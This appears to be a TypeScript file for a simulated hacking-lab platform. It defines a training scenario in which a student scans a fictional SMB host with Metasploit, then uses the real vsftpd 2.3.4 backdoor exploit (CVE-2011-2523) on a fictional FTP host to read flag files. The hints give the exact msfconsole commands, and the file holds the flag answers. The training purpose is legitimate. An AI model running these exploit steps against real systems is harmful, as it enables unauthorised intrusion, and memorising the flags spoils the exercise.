import { dir, file } from '../vfs';
import type { LabScenario } from '../types';

/** A real msfconsole `use`/`set`/`run` workflow across TWO modules against TWO hosts — an auxiliary
 *  scanner first (flag embedded directly in its scanOutput), then a real, historically-accurate
 *  exploit (the vsftpd 2.3.4 backdoor, CVE-2011-2523) that opens an actual session, with the second
 *  flag sitting on disk waiting to be `cat`'d post-exploitation. This engine's `metasploitModule`
 *  mechanic is barely used elsewhere on this platform (three prior labs) despite full support for the
 *  real workflow — this lab spends it properly instead of using the one-line `exploit <name> <ip>` shortcut.
 */
export const msfVsftpdChainLab: LabScenario = {
  id: 'msf-vsftpd-234-backdoor-chain',
  title: 'From Recon to Root: A Classic Metasploit Chain',
  difficulty: 'Medium',
  category: 'Network',
  briefing:
    "Two boxes on the same subnet at Solace Freight: one exposing SMB you haven't fingerprinted yet, " +
    "and one running an FTP server that's been sitting untouched since a migration project stalled out " +
    "years ago. Work this the way a real engagement would — fire up msfconsole, run a proper auxiliary " +
    "scan before you touch anything else, then go after the FTP box with the exploit its version " +
    "practically has painted on it.",
  objectives: [
    { text: 'Scan 10.80.20.6 to confirm SMB is listening', why: "Confirming a port is actually open before loading a module that targets it avoids wasting a run against a service that isn't there." },
    { text: 'Launch msfconsole', why: 'The real Metasploit console workflow — search, use, set, run — is what a proper engagement actually looks like, as opposed to the one-line exploit shortcut.' },
    { text: 'Search for and load the SMB version scanner module', why: 'auxiliary/scanner/smb/smb_version is a real, safe, non-exploitative recon module — the correct first move against an unknown SMB service, before ever touching an exploit.' },
    { text: 'Set RHOSTS to the SMB target', why: 'RHOSTS is the one option every module needs before it can run against anything.' },
    { text: 'Run the auxiliary scan', why: 'An auxiliary scanner never opens a session — it just reports what it found and leaves you back at the module prompt.' },
    { text: 'Return to the main msfconsole prompt with back', why: 'You have to leave the current module before loading a different one — msfconsole only ever has one module active at a time.' },
    { text: 'Load the vsftpd 2.3.4 backdoor exploit module', why: 'vsftpd 2.3.4 (CVE-2011-2523) shipped a backdoored source tarball for a short window in 2011 — a real, famous, unauthenticated RCE, not a made-up vulnerability.' },
    { text: 'Set RHOSTS to the FTP target', why: 'Same requirement as the auxiliary module — the exploit needs to know where to aim.' },
    { text: 'Run the exploit', why: 'Unlike the auxiliary scanner, a successful exploit module opens an actual session on the target — this is the difference between recon and exploitation.' },
    { text: 'Read the flag left on the compromised host with an ABSOLUTE path', why: 'A freshly opened exploit session drops you in a specific starting directory that may not be where the flag actually lives — an absolute path always works regardless of where the session started you.' },
  ],
  hints: [
    'nmap -sV 10.80.20.6',
    'msfconsole',
    'use auxiliary/scanner/smb/smb_version',
    'set RHOSTS 10.80.20.6',
    'run',
    'back',
    'use exploit/unix/ftp/vsftpd_234_backdoor',
    'set RHOSTS 10.80.20.7',
    'run',
    'cat /root/flag.txt',
  ],
  totalFlags: 2,
  attacker: {
    hostname: 'kali',
    user: 'root',
    root: dir({}),
  },
  network: [
    {
      hostname: 'solace-dc01',
      ip: '10.80.20.6',
      os: 'Windows Server 2008 R2 Standard SP1',
      services: [{ port: 445, name: 'smb', version: 'Windows Server 2008 R2' }],
      users: [],
      root: dir({}),
      metasploitModule: {
        path: 'auxiliary/scanner/smb/smb_version',
        requiredOptions: [],
        scanOutput:
          '[+] 10.80.20.6:445    - Host is running Windows Server 2008 R2 Standard SP1 (build:7601) (name:SOLACE-DC01) (domain:SOLACEFREIGHT)\n' +
          '[*] Scanned 1 of 1 hosts (100% complete)\n' +
          '[+] Internal recon note left in SMB banner: flag{msf_auxiliary_scanner_smb_version_recon}',
      },
    },
    {
      hostname: 'solace-ftp01',
      ip: '10.80.20.7',
      os: 'Linux (Ubuntu 8.04, legacy FTP host)',
      services: [{ port: 21, name: 'ftp', version: 'vsftpd 2.3.4', banner: '220 (vsFTPd 2.3.4)' }],
      users: [],
      root: dir({
        root: dir({ 'flag.txt': file('CVE-2011-2523 never dies.\nflag{vsftpd_234_backdoor_unauthenticated_rce_metasploit}\n') }),
      }),
      metasploitModule: {
        path: 'exploit/unix/ftp/vsftpd_234_backdoor',
        requiredOptions: [],
        defaultOptions: { RPORT: '21' },
      },
    },
  ],
};
